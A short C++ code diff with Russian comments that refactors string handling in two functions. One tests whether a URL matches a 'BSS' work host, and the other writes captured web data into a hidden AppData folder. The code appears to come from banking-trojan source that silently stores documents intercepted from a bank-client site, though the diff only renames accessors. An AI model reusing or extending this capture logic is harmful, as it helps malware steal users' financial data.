@@ -289,7 +289,7 @@ bool IsBSSDocument(PCHAR URL)
 		return false;
 
 
-	return STR::Pos(URL, BSSWeb::WorkHost->c_str()) >= 0;
+	return STR::Pos(URL, BSSWeb::WorkHost->t_str()) >= 0;
 }
 
 
@@ -306,7 +306,7 @@ void AddBSSFile(PCHAR aURL, LPVOID Data, DWORD DataSize)
     }
 
 
-    TURL  URL;
+    TURLREC  URL;
 	ClearStruct(URL);
 	ParseURL(aURL, &URL, true);
 
@@ -323,15 +323,18 @@ void AddBSSFile(PCHAR aURL, LPVOID Data, DWORD DataSize)
 	// Определяем каталог хранения
 	string Path(MAX_PATH);
 
-	pSHGetSpecialFolderPathA(NULL, Path.c_str(), CSIDL_APPDATA, TRUE);
+	pSHGetSpecialFolderPathA(NULL, Path.t_str(), CSIDL_APPDATA, TRUE);
+
+	Path.CalcLength();  // Рассмотреть целесообразность такого подхода
+
 	Path += "\\BSS.V1\\";
-	CreateDirectoryA(Path.c_str(), NULL);
+	CreateDirectoryA(Path.t_str(), NULL);
 
 	// Определяем имя файла
 	string FileName = Path + URL.Document;
 
 	// Записываем данные
-	File::WriteBufferA(FileName.c_str(), Data, DataSize);
+	File::WriteBufferA(FileName.t_str(), Data, DataSize);
 
 
 	ClearURL(&URL);
